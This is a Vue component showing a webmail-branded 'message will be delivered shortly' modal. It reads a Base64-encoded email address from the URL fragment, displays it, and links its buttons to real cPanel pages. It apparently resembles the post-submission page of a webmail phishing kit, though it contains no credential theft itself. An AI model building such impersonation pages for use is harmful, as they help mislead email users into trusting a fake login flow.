<template>
  <div class="about-container">
    <!-- <h2>Welcome to the About Page</h2>
    <p v-if="email">Your email: {{ email }}</p> -->

    <main>
      <div class="blur-bg"></div>
      <div class="modal">
        <span
          class="close-btn"
          onclick="window.location.href='https://docs.cpanel.net/webmail/the-webmail-interface/'"
          >&times;</span
        >

        <!-- <h1>Space Successfully Cleared</h1> -->

        <p v-if="email">
          <b>{{ email }}</b>
        </p>

        <div class="logo"></div>
        <span class="close-btn" onclick="window.location.href='https://cpanel.net/'">&times;</span>
        <h1>Your message will be delivered shortly.</h1>
        <div class="verified"></div>
        <button
          onclick="window.location.href='https://docs.cpanel.net/webmail/the-webmail-interface/'"
        >
          Continue
        </button>
      </div>
    </main>
  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue'

const email = ref('')

onMounted(() => {
  try {
    const hash = window.location.hash.substring(1)
    if (hash) {
      const base64Regex = /^[A-Za-z0-9+/=]+$/
      if (base64Regex.test(hash)) {
        try {
          email.value = decodeURIComponent(atob(hash))
        } catch (e) {
          console.error('Error decoding Base64:', e)
          email.value = decodeURIComponent(hash)
        }
      } else {
        email.value = decodeURIComponent(hash)
      }
    }
  } catch (error) {
    console.error('Error extracting email from URL:', error)
  }
})
</script>

<style scoped>
* {
  padding: 0;
  margin: 0;
  box-sizing: border-box;
  font-family: 'Poppins', sans-serif;
}

body,
html {
  background-color: #f4f4f4;
}

main {
  position: relative;
  width: 100%;
  height: 100vh;
  background-image: url(../assets/background.png);
  background-size: cover;
  background-position: center;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 10px;
}

.blur-bg {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  backdrop-filter: blur(6px);
  -webkit-backdrop-filter: blur(6px);
  background-color: rgba(0, 0, 0, 0.4);
  z-index: 1;
}

.logo {
  position: absolute;
  top: 10px;
  left: 30px;
  width: 80px;
  height: auto;
  aspect-ratio: 2 / 1; /* maintains width:height ratio */
  /* background-color: blue; */
  /* Replace with logo image if needed */
  background-image: url('../images/webmail.png');
  background-size: contain;
  background-repeat: no-repeat;
  background-position: center;
  z-index: 3;
}

.modal {
  width: 90%;
  height: min-content;
  max-width: 500px;
  background: #ffffff;
  border: 1px solid #ddd;
  border-radius: 8px;
  backdrop-filter: blur(10px);
  box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
  z-index: 2;
  position: relative;
  display: flex;
  gap: 10px;
  flex-direction: column;
  padding: 40px;
  align-items: center;
  text-align: center;
  justify-content: center;
  color: #333; /* dark text for white background */
  transition: all 0.3s ease-in-out;
}

.modal h1 {
  font-size: 32px;
  margin-bottom: 10px;
  color: #111;
  font-weight: 500;
}

.modal p {
  font-size: 1rem;
  line-height: 1.5;
  color: #444;
  margin-bottom: 10px;
}

.close-btn {
  position: absolute;
  top: 16px;
  right: 16px;
  font-size: 24px;
  color: #ff6c2c;
  cursor: pointer;
  padding: 10px;
  background-color: #f0f0f0;
  width: 24px;
  height: 24px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: 0.2s;
}

.close-btn:hover {
  color: #d91e1e;
}

.modal button {
  background: #ff6c2c;
  border: none;
  color: #fff;
  outline: none;
  font-weight: 600;
  font-size: 1rem;
  border-radius: 6px;
  padding: 8px 20px;
  cursor: pointer;
  transition: background 0.3s ease;
}

.modal button:hover {
  background: #d9531e;
}

/* Sharp and optimized media query for smaller screens */
@media (max-width: 600px) {
  main {
    padding: 20px 10px;
    height: 100vh;
    align-items: center;
  }

  .modal {
    width: 100%;
    height: min-content;
    max-width: none;
    padding: 24px 16px;
    border-radius: 12px;
    gap: 20px;
  }

  .modal h1 {
    font-size: 1.4rem;
  }

  .modal p {
    font-size: 0.95rem;
    line-height: 1.4;
  }

  .modal button {
    font-size: 0.9rem;
    padding: 10px 18px;
  }

  .close-btn {
    width: 28px;
    display: none;
    height: 28px;
    font-size: 20px;
    top: 12px;
    right: 12px;
    margin: 30px;
  }
}
</style>
